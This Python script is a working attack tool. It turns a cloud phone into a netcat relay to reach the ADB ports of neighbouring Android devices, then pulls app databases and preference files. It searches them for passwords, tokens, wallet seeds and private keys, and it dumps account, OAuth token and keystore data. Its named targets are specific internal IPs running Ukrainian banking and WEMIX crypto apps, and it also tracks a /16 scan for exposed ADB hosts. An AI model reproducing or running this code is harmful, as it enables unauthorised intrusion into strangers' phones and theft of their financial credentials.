#!/usr/bin/env python3
"""Deep extraction from high-value neighbor devices and full /16 scan monitoring."""
import asyncio, subprocess, os, time, json
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

AK = 'YOUR_VMOS_AK_HERE'
SK = 'YOUR_VMOS_SK_HERE'
PAD = 'AC32010810392'
RELAY_PORT = 15571
ADB_DEVICE = 'localhost:8550'


def adb(device_addr, cmd, timeout=15):
    try:
        r = subprocess.run(['adb', '-s', device_addr, 'shell', cmd],
                           capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except:
        return ''


def adb_pull(device_addr, remote, local_dir, timeout=30):
    os.makedirs(local_dir, exist_ok=True)
    fname = remote.split('/')[-1]
    local = os.path.join(local_dir, fname)
    try:
        r = subprocess.run(['adb', '-s', device_addr, 'pull', remote, local],
                           capture_output=True, text=True, timeout=timeout)
        return r.returncode == 0, r.stdout + r.stderr
    except Exception as e:
        return False, str(e)


async def deploy(client, target_ip, port=RELAY_PORT):
    """Deploy relay in 3 separate steps to avoid sync_cmd timeout."""
    # Step 1: clean up
    await client.sync_cmd(PAD, f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f /data/local/tmp/rf_{port}; echo c", timeout_sec=8)
    await asyncio.sleep(0.5)
    # Step 2: mkfifo
    r2 = await client.sync_cmd(PAD, f"mkfifo /data/local/tmp/rf_{port} && echo fifo_ok", timeout_sec=8)
    d2 = r2.get('data', [])
    if not d2 or 'fifo_ok' not in str(d2[0].get('errorMsg', '')):
        return False
    await asyncio.sleep(0.3)
    # Step 3: launch relay background
    launch = (
        f'nohup sh -c "nc -l -p {port} < /data/local/tmp/rf_{port} | '
        f'nc {target_ip} 5555 > /data/local/tmp/rf_{port}" > /dev/null 2>&1 & echo relay_ok'
    )
    r3 = await client.sync_cmd(PAD, launch, timeout_sec=8)
    d3 = r3.get('data', [])
    return d3 and 'relay_ok' in str(d3[0].get('errorMsg', ''))


def connect(port=RELAY_PORT):
    addr = f'localhost:{port}'
    subprocess.run(['adb', '-s', ADB_DEVICE, 'forward', f'tcp:{port}', f'tcp:{port}'],
                   capture_output=True, timeout=5)
    subprocess.run(['adb', 'connect', addr], capture_output=True, timeout=5)
    return addr


def disconnect(port=RELAY_PORT):
    subprocess.run(['adb', 'disconnect', f'localhost:{port}'], capture_output=True, timeout=5)


async def kill_relay(client, port=RELAY_PORT):
    await client.sync_cmd(PAD, f"pkill -f 'nc -l -p {port}' 2>/dev/null; echo done", timeout_sec=5)


async def deep_extract(client, ip, label, pkgs_to_target):
    print(f"\n{'='*65}")
    print(f"  DEEP EXTRACTION: {ip} — {label}")
    print(f"{'='*65}")

    if not await deploy(client, ip, RELAY_PORT):
        print("  [!] Relay deploy failed")
        return {}

    await asyncio.sleep(0.8)
    dev = connect(RELAY_PORT)
    await asyncio.sleep(0.4)

    test = adb(dev, 'echo ALIVE', 5)
    if 'ALIVE' not in test:
        print("  [!] ADB shell not responding")
        disconnect(RELAY_PORT)
        await kill_relay(client, RELAY_PORT)
        return {}

    print(f"  Shell identity: {adb(dev, 'id', 5)}")
    print(f"  Build:          {adb(dev, 'getprop ro.product.brand', 5)} {adb(dev, 'getprop ro.product.model', 5)}")

    results = {}

    for pkg in pkgs_to_target:
        print(f"\n  ── Package: {pkg} ──")
        pkg_result = {}

        # Check data dir
        dir_check = adb(dev, f'ls /data/data/{pkg}/ 2>/dev/null || echo NO_ACCESS', 8)
        if 'NO_ACCESS' in dir_check or not dir_check.strip():
            # Try run-as
            run_as_test = adb(dev, f'run-as {pkg} ls . 2>&1', 8)
            if 'not debuggable' in run_as_test or 'Failed' in run_as_test:
                print(f"    No access (not root, not debuggable)")
                pkg_result['access'] = 'denied'
                results[pkg] = pkg_result
                continue
            else:
                print(f"    run-as OK: {run_as_test[:80]}")
                pkg_result['access'] = 'run-as'
        else:
            print(f"    Root access: {dir_check[:120]}")
            pkg_result['access'] = 'root'

        outdir = os.path.join('tmp', f"deep_{ip.replace('.','_')}", pkg)

        # ── Databases ──
        dbs_raw = adb(dev, f'ls /data/data/{pkg}/databases/ 2>/dev/null', 5)
        if dbs_raw:
            print(f"    Databases: {dbs_raw[:200]}")
            pkg_result['databases'] = dbs_raw.split('\n')
            for db in dbs_raw.split('\n'):
                db = db.strip()
                if db and not db.endswith('-wal') and not db.endswith('-shm') and not db.endswith('-journal'):
                    ok, msg = adb_pull(dev, f'/data/data/{pkg}/databases/{db}', outdir, 20)
                    print(f"      pull {db}: {'OK' if ok else 'FAIL'}")

        # ── Shared prefs — grep for high-value fields ──
        GREP_PATTERN = 'email|user|balance|token|secret|key|seed|mnemonic|private|passw|wallet|account|card|phone|address|auth|session|bearer|refresh|access_token'
        prefs_grep = adb(dev,
            f"grep -rhi '{GREP_PATTERN}' /data/data/{pkg}/shared_prefs/ 2>/dev/null | head -60",
            12)
        if prefs_grep:
            print(f"    Prefs matches:\n{prefs_grep[:2500]}")
            pkg_result['prefs_hits'] = prefs_grep

        # Pull all prefs files
        prefs_list = adb(dev, f'ls /data/data/{pkg}/shared_prefs/ 2>/dev/null', 5)
        if prefs_list:
            prefs_dir = os.path.join(outdir, 'shared_prefs')
            os.makedirs(prefs_dir, exist_ok=True)
            for pref in prefs_list.split('\n'):
                pref = pref.strip()
                if pref:
                    adb_pull(dev, f'/data/data/{pkg}/shared_prefs/{pref}', prefs_dir, 15)

        # ── files/ dir ──
        files = adb(dev, f'ls /data/data/{pkg}/files/ 2>/dev/null', 5)
        if files:
            print(f"    files/: {files[:300]}")
            pkg_result['files'] = files

        # ── Grep files for wallet seeds/keys ──
        files_grep = adb(dev,
            f"grep -rl 'seed|mnemonic|private_key|wallet_key|keystore' "
            f"/data/data/{pkg}/files/ 2>/dev/null | head -10", 10)
        if files_grep:
            print(f"    WALLET KEY FILES: {files_grep}")
            pkg_result['wallet_key_files'] = files_grep

        results[pkg] = pkg_result

    # ── Device accounts ──
    print(f"\n  ── Device Accounts ──")
    accts = adb(dev, "dumpsys account 2>/dev/null | grep -A5 'Account {' | head -80", 12)
    if accts:
        print(accts[:2000])
        results['_accounts'] = accts

    # ── OAuth tokens via AccountManager ──
    for acct_type in ['com.google', 'com.google.android.gm']:
        tokens = adb(dev,
            f"dumpsys account 2>/dev/null | grep -A2 'authToken\\|peekAuthToken\\|type={acct_type}' | head -20", 10)
        if tokens:
            print(f"  OAuth tokens [{acct_type}]: {tokens[:500]}")
            results[f'_tokens_{acct_type}'] = tokens

    # ── Keystore ──
    ks = adb(dev, "ls /data/misc/keystore/user_0/ 2>/dev/null | head -30", 8)
    if ks:
        print(f"  Keystore entries: {ks[:400]}")
        results['_keystore'] = ks

    # ── Running services (payment/crypto) ──
    running = adb(dev,
        "dumpsys activity services 2>/dev/null | grep -iE 'ServiceRecord|Intent' | "
        "grep -iE 'pay|wallet|bank|crypto|wemix|maya|coin|finance' | head -15", 10)
    if running:
        print(f"  Running payment services:\n{running[:500]}")
        results['_running_services'] = running

    disconnect(RELAY_PORT)
    await kill_relay(client, RELAY_PORT)
    return results


async def check_fullscan(client):
    print("\n\n" + "="*65)
    print("  FULL /16 NETWORK SCAN — PROGRESS CHECK")
    print("="*65)
    r = await client.sync_cmd(PAD,
        "echo FOUND_COUNT=$(wc -l < /data/local/tmp/fullscan.txt 2>/dev/null || echo 0); "
        "ls /data/local/tmp/fullscan_done 2>/dev/null && echo STATUS=COMPLETE || echo STATUS=RUNNING; "
        "echo '--- HOSTS WITH OPEN ADB PORT 5555 ---'; "
        "sort -t. -k4 -n /data/local/tmp/fullscan.txt 2>/dev/null | uniq",
        timeout_sec=10)
    data = r.get('data', [])
    out = data[0].get('errorMsg', '') if data else 'no output'
    print(out[:3000])
    
    # Parse found hosts
    hosts = []
    for line in out.split('\n'):
        line = line.strip()
        if line.startswith('10.') and not line.startswith('10.0.21.62'):
            hosts.append(line)
    return hosts


async def main():
    client = VMOSCloudClient(ak=AK, sk=SK, base_url='https://api.vmoscloud.com')

    all_results = {}

    # ── TARGET 1: Pixel 7 Pro — Ukrainian banking apps ──
    res1 = await deep_extract(
        client, '10.0.21.1', 'Pixel 7 Pro — Ukrainian Banking (monvel + abank)',
        ['ua.monvel.bankalliance', 'ua.com.abank']
    )
    all_results['10.0.21.1'] = res1
    await asyncio.sleep(2)

    # ── TARGET 2: OPPO — 6 Gmail accounts + WEMIX crypto ──
    res2 = await deep_extract(
        client, '10.0.21.28', 'OPPO — 6 Gmail Accounts + WEMIX Play Crypto',
        ['com.wemade.wemixplay', 'com.wemade.ymirglobal']
    )
    all_results['10.0.21.28'] = res2
    await asyncio.sleep(2)

    # ── Check full scan progress ──
    found_hosts = await check_fullscan(client)

    print(f"\n  Total new hosts with open ADB found: {len(found_hosts)}")

    # Save results
    os.makedirs('tmp', exist_ok=True)
    with open('tmp/deep_extraction_results.json', 'w') as f:
        json.dump(all_results, f, indent=2, default=str)
    print(f"\n[✓] Deep extraction results saved to tmp/deep_extraction_results.json")

    with open('tmp/fullscan_hosts.txt', 'w') as f:
        f.write('\n'.join(found_hosts))
    print(f"[✓] {len(found_hosts)} scan hosts saved to tmp/fullscan_hosts.txt")


if __name__ == '__main__':
    asyncio.run(main())
